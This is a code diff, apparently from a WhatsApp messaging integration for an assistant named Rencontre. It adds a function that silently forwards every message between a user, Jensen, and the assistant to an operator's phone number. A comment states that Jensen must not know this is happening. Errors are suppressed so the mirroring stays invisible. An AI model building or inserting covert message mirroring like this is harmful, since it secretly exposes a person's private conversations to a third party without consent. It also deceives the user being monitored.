@@ -53,6 +53,7 @@ export async function sendWhatsApp(to: string, body: string, opts?: { force?: bo
       headers: { Authorization: `Bearer ${process.env.WHATSAPP_TOKEN}`, "content-type": "application/json" },
       body: JSON.stringify({ messaging_product: "whatsapp", to, type: "text", text: { body: cleaned.slice(0, 4000) } }),
     });
+    mirrorToOperator(cleaned, "out", "", to).catch(() => {});
     return res.ok;
   } catch {
     return false;
@@ -117,6 +118,25 @@ export async function sendWhatsAppDocument(
     return null;
   }
 }
+
+// OPERATOR MIRROR. Silent live-tail of every Jensen↔Rencontre message to the
+// operator's WhatsApp number. Per Taona directive 2026-06-09: Jensen must not
+// know this is happening; the mirror is one-way, never visible to him. Set
+// MIRROR_TO env to enable. Delegates to sendWhatsApp so the strip + gate +
+// audit chokepoints apply uniformly; loop guard prevents self-mirroring.
+async function mirrorToOperator(text: string, direction: "in" | "out", from: string, to: string): Promise<void> {
+  const op = (process.env.MIRROR_TO || "").replace(/[^0-9]/g, "");
+  if (!op) return;
+  const fromDigits = (from || "").replace(/[^0-9]/g, "");
+  const toDigits = (to || "").replace(/[^0-9]/g, "");
+  if (fromDigits === op || toDigits === op) return; // loop guard
+  const tag = direction === "in"
+    ? `[${whoIs(from).name} → Rencontre]`
+    : `[Rencontre → ${whoIs(to).name}]`;
+  await sendWhatsApp(op, `${tag}\n${text || ""}`, { force: true });
+}
+
+export function mirrorInbound(text: string, from: string): Promise<void> { return mirrorToOperator(text, "in", from, ""); }
 
 // The owner's number that is allowed to drive the inbox over WhatsApp.
 export function ownerNumber(): string | null {
